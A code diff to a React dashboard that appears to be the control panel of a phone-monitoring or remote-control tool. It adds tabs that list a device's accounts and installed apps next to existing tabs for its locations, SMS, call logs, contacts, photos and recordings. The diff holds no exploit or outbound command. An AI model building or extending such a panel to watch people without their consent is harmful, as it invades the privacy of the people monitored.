@@ -37,7 +37,7 @@ const COMMANDS = [
   { type: 'get_storage_info', label: 'Storage Info', icon: FiHardDrive, desc: 'Get storage information', color: 'text-cyan-400' },
 ];
 
-const DATA_TABS = ['locations', 'sms', 'calllogs', 'contacts', 'photos', 'recordings', 'commands'];
+const DATA_TABS = ['locations', 'sms', 'calllogs', 'contacts', 'photos', 'recordings', 'accounts', 'apps', 'commands'];
 
 // Uploads are served at /uploads (not /api/uploads), so strip /api from the base URL
 const UPLOADS_BASE_URL = (process.env.REACT_APP_API_URL || 'http://localhost:5000/api').replace(/\/api$/, '');
@@ -451,6 +451,40 @@ function renderDataContent(tab, items, refresh) {
               </div>
               {item.params && Object.keys(item.params).length > 0 && (
                 <pre className="text-gray-500 text-xs mt-1">{JSON.stringify(item.params)}</pre>
+              )}
+            </div>
+          ))}
+        </div>
+      );
+
+    case 'accounts':
+      return (
+        <div className="space-y-2 max-h-96 overflow-y-auto">
+          {items.map((item, i) => (
+            <div key={i} className="bg-dark-700/50 rounded-lg p-3 text-sm flex items-center gap-3">
+              <div className="w-8 h-8 bg-dark-600 rounded-full flex items-center justify-center text-gray-400 text-xs">
+                {item.type?.[0]?.toUpperCase() || 'A'}
+              </div>
+              <div>
+                <p className="text-white text-sm font-medium">{item.name || item.type || 'Unknown Account'}</p>
+                <p className="text-gray-400 text-xs">{item.type || '-'}</p>
+              </div>
+            </div>
+          ))}
+        </div>
+      );
+
+    case 'apps':
+      return (
+        <div className="space-y-1 max-h-96 overflow-y-auto">
+          {items.map((item, i) => (
+            <div key={i} className="bg-dark-700/50 rounded-lg p-3 text-sm flex items-center justify-between">
+              <div>
+                <p className="text-white text-sm">{item.appName || item.packageName || 'Unknown App'}</p>
+                <p className="text-gray-500 text-xs font-mono">{item.packageName || '-'}</p>
+              </div>
+              {item.versionName && (
+                <span className="text-gray-500 text-xs">{item.versionName}</span>
               )}
             </div>
           ))}
